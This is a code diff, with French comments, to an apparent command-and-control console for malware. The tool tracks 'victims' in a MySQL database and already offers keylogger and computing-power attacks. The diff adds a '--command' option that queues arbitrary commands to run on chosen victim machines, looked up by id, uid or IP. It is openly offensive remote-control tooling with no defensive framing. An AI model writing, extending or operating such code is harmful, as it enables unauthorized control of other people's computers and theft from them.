@@ -78,6 +78,9 @@ action_group.add_argument("--keylogger", action="store_true", help="lance un key
 # Arguments spécifiques à l'attaque force de calcul
 action_group.add_argument("--calcul", action="store_true", help="lance une attaque de force de calcul sur un ordinateur")
 
+# Arguments spécifiques à l'attaque command
+action_group.add_argument("--command", action="store_true", help="lance une commande sur un ordinateur")
+
 
 # SQL request
 action_group.add_argument("--showall", action="store_true", help="Récupère toutes les informations d'une table donnée")
@@ -202,6 +205,36 @@ elif args.keylogger:
     except mysql.connector.Error as e:
         logger.error("Erreur lors de l'insertion de l'attaque keylogger dans la base de données")
 
+
+############################################################
+
+elif args.command:
+    if not args.host:
+        logger.error("--command nécessite l'argument --host")
+        parser.error("--command nécessite l'argument --host")
+    elif not args.value:
+        logger.error("--command nécessite l'argument --value")
+        parser.error("--command nécessite l'argument --value")
+
+    try:
+        for victim in args.host.split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim, )
+            mycursor.execute(query, values)
+
+            result = mycursor.fetchall()
+
+            for id in result:
+                query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (id[0], "command", "pending", "{\"arg1\": \"" + str(args.value) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+                mycursor.execute(query, values)
+        print("command lancé sur " + args.host)
+        logger.info("attack:command, command:" + str(args.value) + ", host:"+ str(args.host))
+    except mysql.connector.ProgrammingError as e:
+        logger.error("Erreur de syntaxe SQL lors de l'insertion de l'attaque command dans la base de données")
+    except mysql.connector.Error as e:
+        logger.error("Erreur lors de l'insertion de l'attaque command dans la base de données")
 
 ############################################################
 
